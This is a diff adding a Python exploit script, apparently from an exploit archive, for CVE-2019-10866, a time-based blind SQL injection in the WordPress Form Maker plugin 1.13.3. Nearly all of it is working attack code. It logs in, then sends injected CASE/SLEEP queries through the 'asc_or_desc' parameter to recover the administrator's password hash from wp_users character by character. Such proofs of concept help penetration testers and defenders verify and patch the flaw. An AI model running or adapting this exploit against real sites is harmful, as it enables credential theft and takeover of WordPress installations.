@@ -1,0 +1,59 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: WordPress Plugin Form Maker 1.13.3 - SQL Injection
+# Date: 22-03-2019
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Vendor Homepage: https://10web.io/plugins/
+# Software Link: https://wordpress.org/plugins/form-maker/
+# Version: 1.13.3
+# Tested on: Ubuntu 18.04
+# CVE : CVE-2019-10866
+
+import requests
+import time
+
+url_vuln = 'http://localhost/wordpress/wp-admin/admin.php?page=submissions_fm&task=display&current_id=2&order_by=group_id&asc_or_desc='
+session = requests.Session()
+dictionary = '@._-$/\\"£%&;§+*1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+flag = True
+username = "username"
+password = "password"
+temp_password = ""
+TIME = 0.5
+
+def login(username, password):
+    payload = {
+        'log': username,
+        'pwd': password,
+        'wp-submit': 'Login',
+        'redirect_to': 'http://localhost/wordpress/wp-admin/',
+        'testcookie': 1
+    }
+    session.post('http://localhost/wordpress/wp-login.php', data=payload)
+
+def print_string(str):
+    print "\033c"
+    print str
+
+def get_admin_pass():
+    len_pwd = 1
+    global flag
+    global temp_password
+    while flag:
+        flag = False
+        ch_temp = ''
+        for ch in dictionary:
+            print_string("[*] Password dump: " + temp_password + ch)
+            ch_temp = ch
+            start_time = time.time()
+            r = session.get(url_vuln + ',(case+when+(select+ascii(substring(user_pass,' + str(len_pwd) + ',' + str(len_pwd) + '))+from+wp_users+where+id%3d1)%3d' + str(ord(ch)) + '+then+(select+sleep(' + str(TIME) + ')+from+wp_users+limit+1)+else+2+end)+asc%3b')
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            temp_password += ch_temp
+            len_pwd += 1
+
+login(username, password)
+get_admin_pass()
+print_string("[+] Password found: " + temp_password)
